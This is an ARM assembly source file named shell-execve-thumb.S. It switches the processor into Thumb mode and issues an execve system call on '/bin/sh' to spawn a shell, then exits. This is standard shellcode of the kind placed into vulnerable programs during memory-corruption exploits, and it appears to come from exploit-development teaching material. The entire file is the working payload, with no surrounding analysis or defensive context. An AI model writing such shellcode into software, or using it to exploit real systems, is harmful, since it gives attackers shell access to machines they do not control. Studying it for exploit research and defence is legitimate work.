//shell-execve-thumb.S
.text

.global _start
_start:

.code 32
add r1, pc, #1
bx r1

.code 16

adr r0, filename        //const char *filename
mov r1, #0              //const char *argv
mov r2, #0              //const char *envp
mov r7, #0xb            //syscall number of execve
svc #0

mov r0, #0              //exit code
mov r7, #1              //syscall number of exit
svc #0

filename:
.asciz "/bin/sh"